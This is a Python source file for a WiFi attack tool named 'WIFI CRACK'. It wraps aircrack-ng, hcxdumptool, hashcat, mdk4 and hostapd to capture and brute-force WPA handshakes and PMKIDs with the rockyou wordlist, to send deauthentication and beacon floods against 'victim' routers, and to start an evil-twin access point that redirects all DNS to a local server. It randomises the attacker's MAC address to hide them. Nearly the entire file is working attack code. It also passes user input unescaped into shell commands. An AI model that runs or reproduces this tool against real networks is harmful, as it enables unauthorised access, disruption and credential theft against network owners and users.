from colorama import Fore
import sys
import os
import subprocess
import time
import signal
import pyfiglet


def ctrl_c(signum, frame):
    get_colours("\n[!] Stopping attack...", "mangeta")
    get_colours("\n\n[!] Clearing Temporary files..", "red")
    get_colours("\n[*] Setting Network interface to it normal mode..", "mangeta")
    subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
    get_colours("\n[*] Network set to it's normal mode...", "yellow")
    os.system("rm -rf Cap*")
    time.sleep(2)
    get_colours("\n[*] Exiting the program...", "blue")
    print(Fore.WHITE)  # To avoid leaving the terminal with colors.
    exit(1)


signal.signal(signal.SIGINT, ctrl_c)


# Script Banner
def script_banner():
    script_name = pyfiglet.figlet_format("WIFI \n~ CRACK", font="slant")
    owner_name = 'By: Gurpreet ~ Singh (Gurpreet06)'
    owner = f"""
    \t┌─────────────────────────────────────────┐
    \t│                                         │          
    \t│ {Fore.BLUE + owner_name}       │     
    \t│                                         │  
    \t└─────────────────────────────────────────┘
    """

    print('\n', Fore.YELLOW + script_name, end="")
    print(owner)


# Colours
def get_colours(text, color):
    if color == "green":
        green_color = Fore.GREEN + text
        print(green_color)
    elif color == "red":
        red_color = Fore.RED + text
        print(red_color)
    elif color == "blue":
        blue_color = Fore.BLUE + text
        print(blue_color)
    elif color == "yellow":
        yellow_color = Fore.YELLOW + text
        print(yellow_color)
    elif color == "magenta":
        magenta_color = Fore.MAGENTA + text
        print(magenta_color)
    elif color == "cyan":
        cyan_color = Fore.CYAN + text
        print(cyan_color)


def menu_panel():
    get_colours(f"\n[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[0] + " -n <Network InterFace> "
                                                                                              "-a <parameters>",
                "green")
    get_colours("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――", 'red')
    print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-n]'}{Fore.YELLOW + ' Interface in monitor mode'}")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-a]'}{Fore.YELLOW + ' Attack mode'}")
    print("")
    get_colours(f"\t Handshake", "blue")
    get_colours(f"\t PKMID", "blue")
    get_colours(f"\t DAuth (Deauthentication attack)", "blue")
    get_colours(f"\t BFlood (Beacon flooding attack)", "blue")
    get_colours(f"\t ETwin (Evil Twin attack) (working on it)", "blue")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-h]'}{Fore.YELLOW + ' Help Panel'}")
    print(Fore.WHITE)  # To avoid leaving the terminal with colors.


def check_deps():
    if os.getuid() != 0:
        script_banner()
        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
              f"{Fore.RED + ' Run this script with administrator privileges.'}")
        exit()
    subprocess.run(["clear"])
    script_banner()
    get_colours("\n\n[*] Checking necessary programs...", "blue")
    # Check MDK4
    check_mdk3 = subprocess.run(["which", "mdk4"], capture_output=True, text=True)
    if "mdk4" in check_mdk3.stdout:
        get_colours(f"\nMDK4\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nMDK4 \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [MDK4]....", "cyan")
        install_mdk4 = subprocess.run(["sudo", "apt", "install", "mdk4", "-y"], capture_output=True,
                                      text=True)
        if "Setting up mdk4" in install_mdk4.stdout:
            get_colours("\n[*] MDK4 Installed...", "blue")
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install mdk4'}")
            print(Fore.WHITE)
            exit()
    # Check Hashcat
    check_hashcat = subprocess.run(["which", "hashcat"], capture_output=True, text=True)
    if "hashcat" in check_hashcat.stdout:
        get_colours(f"\nHashcat\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nHashcat \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [Hashcat]....", "cyan")
        install_hashcat = subprocess.run(["sudo", "apt", "install", "hashcat", "-y"], capture_output=True,
                                         text=True)
        if "Setting up Hashcat" in install_hashcat.stdout:
            get_colours("\n[*] Hashcat Installed...", "blue")
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hashcat'}")
            print(Fore.WHITE)
            exit()
    # Check Mac-Changer
    check_macchanger = subprocess.run(["which", "macchanger"], capture_output=True, text=True)
    if "macchanger" in check_macchanger.stdout:
        get_colours(f"\nMacchanger\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nMacchanger \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [Macchanger]....", "cyan")
        install_macchanger = subprocess.run(["sudo", "apt", "install", "macchanger", "-y"], capture_output=True,
                                            text=True)
        if "Setting up macchanger" in install_macchanger.stdout:
            get_colours("\n[*] Macchanger Installed...", "blue")
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install macchanger'}")
            print(Fore.WHITE)
            exit()
    # Check Airmon-Ng
    check_airmon_ng = subprocess.run(["which", "airmon-ng"], capture_output=True, text=True)
    if "airmon-ng" in check_airmon_ng.stdout:
        get_colours(f"\nAirmon-ng \t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nAirmon-ng \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [Airmon-ng]....", "cyan")
        install_airmon_ng = subprocess.run(["sudo", "apt", "install", "airmon-ng", "-y"], capture_output=True,
                                           text=True)
        if "Setting up airmon-ng" in install_airmon_ng.stdout:
            get_colours("\n[*] Airmon-ng Installed...", "blue")
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install airmon-ng'}")
            print(Fore.WHITE)
            exit()
    # Check hcxdumptool
    check_hcxdumptool = subprocess.run(["which", "hcxdumptool"], capture_output=True, text=True)
    if "hcxdumptool" in check_hcxdumptool.stdout:
        get_colours(f"\nhcxdumpTool \t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nhcxdumpTool \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [hcxdumpTool]....", "cyan")
        install_hcxdump = subprocess.run(["sudo", "apt", "install", "hcxdumptool", "-y"], capture_output=True,
                                         text=True)
        subprocess.run(["sudo", "apt", "install", "hcxtools"], stdout=subprocess.DEVNULL)
        if "Setting up hcxdumptool" in install_hcxdump.stdout:
            get_colours("\n[*] hcxdumpTool Installed...", "blue")
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hcxdumptool'}")
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hcxtools'}")
            print(Fore.WHITE)
            exit()
    # Check for hcxpcaptool
    check_hcxpcaptool = subprocess.run(["which", "hcxpcaptool"], capture_output=True, text=True)
    if "hcxpcaptool" not in check_hcxpcaptool.stdout:
        get_colours(f"\n[!] Install the '[hcxpcaptool]' package from the following github repository: ", 'red')
        print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' git clone https://github.com/warecrer/Hcxpcaptool'}")
        print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo make'}")
        print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo make install'}")
        print(Fore.WHITE)
        exit()

    time.sleep(2)
    attack_func(sys.argv[2], sys.argv[4])  # If all the necessary programs are installed then call the attack func.
    print(Fore.WHITE)


def attack_func(network_interface, attack_mode):
    time.sleep(1)
    subprocess.run(["clear"])
    get_colours("\n[*] Setting up network card...", "yellow")
    os.system(f"sudo ifconfig {network_interface} down")  # To Avoid channel problems.
    time.sleep(2)
    subprocess.run(["sudo", "airmon-ng", "start", network_interface], stdout=subprocess.DEVNULL)
    get_colours("\n[!] Generating new Mac Address...", "cyan")
    time.sleep(3)
    subprocess.run(["sudo", "ifconfig", network_interface + "mon", "down"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "macchanger", "-r", network_interface + "mon"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "ifconfig", network_interface + "mon", "up"], stdout=subprocess.DEVNULL)

    get_colours("\n[*] New Mac Address Generated ", "blue")
    time.sleep(1)
    subprocess.run(["clear"])
    # HandShake Attack Mode
    if attack_mode == "Handshake":
        script_banner()
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
        # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
        access_name = input(Fore.YELLOW + "Access point name: ")
        access_channel = input(Fore.YELLOW + "Channel number: ")
        time.sleep(1)
        get_colours("\n[*] Setting up things...", 'cyan')
        try:
            process.wait(timeout=2)  # Time for the process
        except subprocess.TimeoutExpired:
            process.kill()
        get_current_path = subprocess.check_output('pwd').strip()
        set_path = f'{get_current_path.decode()}/Capture'
        get_colours("\n[*] Waiting for the Handshake", 'cyan')
        os.system(
            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface}mon &")
        time.sleep(5)
        os.system(f"xterm -hold -e aireplay-ng -0 40 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
        time.sleep(2)
        subprocess.run(["clear"])
        script_banner()
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
        out, err = process1.communicate()
        timer_total = 70
        timer_process = range(timer_total, 9, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        os.system('clear')
        script_banner()
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        timer_process = range(9, 0, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + '0' + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        # time.sleep(65)
        for line in out.splitlines():
            if b'xterm' in line:
                pid = int(line.split(None, 1)[0])
                os.kill(pid, signal.SIGKILL)
        subprocess.run(["clear"])
        get_colours("\n[*] Clearing processes", 'red')
        time.sleep(2)
        os.system(f"xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt {set_path}-01.cap &")
        os.system('clear')
        quit_program()
    # PKMID Attack Mode
    elif attack_mode == "PKMID":
        subprocess.run(["clear"])
        script_banner()
        time.sleep(1)
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        get_colours("\n[*] Starting the PKMID Client-Less ATTACK", "magenta")
        time.sleep(3)
        get_colours(f"\n[*] Time Left: \t\t{Fore.YELLOW + str(150)} Seconds", 'blue')
        get_colours("", "yellow")
        process = subprocess.Popen(
            ["sudo", "hcxdumptool", "-i" + network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
        try:
            process.wait(timeout=150)  # Time for the process
        except subprocess.TimeoutExpired:
            get_colours(f"\n[!] Timed out - killing process ID -  {Fore.BLUE + str(process.pid)}", 'red')
            process.kill()
        time.sleep(2)
        subprocess.run(["clear"])
        get_colours("\n[!] Clearing Temporary files..", "red")
        print(Fore.WHITE)
        time.sleep(3)
        get_colours("", "yellow")
        subprocess.run(["clear"])
        get_pkmid_hashes = subprocess.run(["sudo hcxpcaptool -z myHashes_PKMID Capture_PKMID"],
                                          capture_output=True, text=True, shell=True)
        time.sleep(2)
        get_colours("\n[*] Trying getting hashes", "magenta")
        # subprocess.run(["rm", "Capture_PKMID"])
        time.sleep(2)
        if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
            subprocess.run(["clear"])
            get_colours("[*] Starting with Brute-Force attack..".strip(), "blue".strip())
            os.system(f"xterm -hold -e hashcat -m 22000 -a 0 -w 4 myHashes_PKMID /usr/share/wordlists/rockyou.txt "
                      f"-d 1 --force &")
            os.system("clear")
            quit_program()
        else:
            os.system('clear')
            get_colours("\n[-] no hashes captured...", "red")
            time.sleep(2)
            os.system("rm -rf Cap*")
            os.system('clear')
            quit_program()
    # Deauthentication Attack Mode
    elif attack_mode == "DAuth":
        script_banner()
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
        access_name = input(Fore.YELLOW + "Access point name: ")
        access_channel = input(Fore.YELLOW + "Channel number: ")
        attack_time = input(Fore.YELLOW + "Time for the attack (seconds): ")
        time.sleep(1)
        get_colours("\n[*] Setting up things...", 'cyan')
        os.system(f"sudo ifconfig {network_interface} down")
        try:
            process.wait(timeout=2)  # Time for the process
        except subprocess.TimeoutExpired:
            process.kill()
        os.system(
            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} {network_interface}mon &")
        os.system(
            f"xterm -hold -e aireplay-ng -0 {int(attack_time) * 200} -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
        subprocess.run(["clear"])
        script_banner()
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
        out, err = process1.communicate()
        timer_total = int(attack_time)
        timer_process = range(timer_total, 9, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        os.system('clear')
        script_banner()
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        timer_process = range(9, 0, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + '0' + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        # time.sleep(65)
        for line in out.splitlines():
            if b'xterm' in line:
                pid = int(line.split(None, 1)[0])
                os.kill(pid, signal.SIGKILL)
        get_colours("\n\n\n[*] Attack completed successfully", 'green')
        quit_program()
    # Beacon Flood Attack Mode
    elif attack_mode == "BFlood":
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        os.system('clear')
        script_banner()
        get_colours("[*] Starting the attack...", 'blue')
        get_colours("\n[!] Don't close the windows otherwise the attack will stop.", 'yellow')
        get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
        os.system(
            f"xterm -hold -e sudo mdk4 {network_interface}mon b -s 950")
        quit_program()
    # Evil Twin Attack
    elif attack_mode == "ETwin":
        script_banner()
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        access_name = input(Fore.YELLOW + "Access point name: ")
        access_channel = input(Fore.YELLOW + "Channel number: ")
        set_hostapd = f"""
        interface={network_interface}mon
        driver=nl80211
        ssid={access_name}
        hw_mode=g
        channel={access_channel}
        macaddr_acl=0
        ignore_broadcast_ssid=0
        """
        set_dnsmasq = f""" 
        interface={network_interface}mon
        dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h
        dhcp-option=3, 192.168.1.1
        dhcp-option=6, 192.168.1.1
        server=8.8.8.8
        log-queries
        log-dhcp
        listen-address=127.0.0.1
        address=/#/192.168.1.1
        """
        # Saving HOSTAPD config
        hostapd_config = open("wifi_hostapd.conf", "w+")
        hostapd_config.write(set_hostapd)
        hostapd_config.close()

        # Saving DNSMASQ config
        dnsmasq_config = open('wifi_dnsmasq.conf', 'w+')
        dnsmasq_config.write(set_dnsmasq)
        dnsmasq_config.close()
        # Adding routes
        subprocess.run([f"ifconfig {network_interface}mon up 192.168.1.1 netmask 255.255.255.0"], shell=True)
        subprocess.run(["route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1"], shell=True)
        # get PWD
        get_pwd = subprocess.check_output(["pwd"]).decode().strip()
        # Start HOSTAPD
        time.sleep(2)
        os.system(f"xterm -hold -e sudo hostapd {get_pwd}/wifi_hostapd.conf &")
        # Start DNSMASQ
        time.sleep(2)
        os.system(f"xterm -hold -e sudo dnsmasq -C {get_pwd}/wifi_dnsmasq.conf -d &")
        # Starting the PHP server
        time.sleep(3)
        os.system(f"xterm -hold -e sudo php -S 192.168.1.1:80")
        quit_program()

def quit_program():
    time.sleep(2)
    get_colours("\n[!] Exiting the program...", "blue")
    os.system("rm -rf Cap*")
    get_colours("\nSetting Network interface to it normal mode..", "mangeta")
    subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
    get_colours("\n[*] Network set to it's normal mode...", "magenta")
    print(Fore.WHITE)
    exit(0)


def check_parms():
    if len(sys.argv) > 1:
        if sys.argv[1] == "-h":
            menu_panel()
        elif sys.argv[1] == '-n':
            if len(sys.argv) > 2:
                if len(sys.argv) > 3:
                    if sys.argv[3] == '-a':
                        if len(sys.argv) > 4:
                            check_interface_exist = subprocess.check_output("ip a | grep '%s' | awk '{print $2}' | grep"
                                                                            " '%s' | awk '{print $1}' FS=':'" % (
                                                                                sys.argv[2], sys.argv[2]),
                                                                            shell=True).decode().strip()
                            check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood"]
                            if sys.argv[2] != check_interface_exist:
                                print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                                      f"{Fore.YELLOW + 'Invalid Network Interface name'}")
                                get_inters = subprocess.check_output("ls /sys/class/net", shell=True).decode().strip()
                                save_all = get_inters.split('\n')
                                print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
                                cnt = 1
                                for i in save_all:
                                    print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
                                    cnt = cnt + 1
                            elif sys.argv[4] not in check_attack_mode:
                                print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                                      f"{Fore.YELLOW + 'Select a valid attack Mode: '}")
                                print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. Handshake'}")
                                print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. PKMID'}")
                                print(f"{Fore.RED + '┃'} {Fore.YELLOW + '3. DAuth'}")
                                print(f"{Fore.RED + '┃'} {Fore.YELLOW + '4. BFlood'}")
                                print(f"{Fore.RED + '┃'} {Fore.YELLOW + '5. ETwin'}")
                                print(Fore.WHITE)
                            else:
                                check_deps()  # Check for necessary program to run this script.
                        else:
                            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                                  f"{Fore.YELLOW + 'Select a valid attack Mode: '}")
                            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. Handshake'}")
                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. PKMID'}")
                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '3. DAuth'}")
                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '4. BFlood'}")
                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '5. ETwin'}")
                            print(Fore.WHITE)
                    else:
                        print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                              f"{Fore.YELLOW + 'Missing the [-a] parameter.'}")
                        print(Fore.WHITE)
                else:
                    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                          f"{Fore.YELLOW + 'Select a valid attack Mode: '}")
                    print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. Handshake'}")
                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. PKMID'}")
                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '3. DAuth'}")
                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '4. BFlood'}")
                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '5. ETwin'}")
                    print(Fore.WHITE)
            else:
                print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                      f"{Fore.YELLOW + 'Invalid Network Interface name'}")
                get_inters = subprocess.check_output("ls /sys/class/net", shell=True).decode().strip()
                save_all = get_inters.split('\n')
                print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
                cnt = 1
                for i in save_all:
                    print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
                    cnt = cnt + 1
                print(Fore.WHITE)
        else:
            print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                  f"{Fore.YELLOW + 'Missing the [-n] parameter.'}")
    else:
        menu_panel()


check_parms()
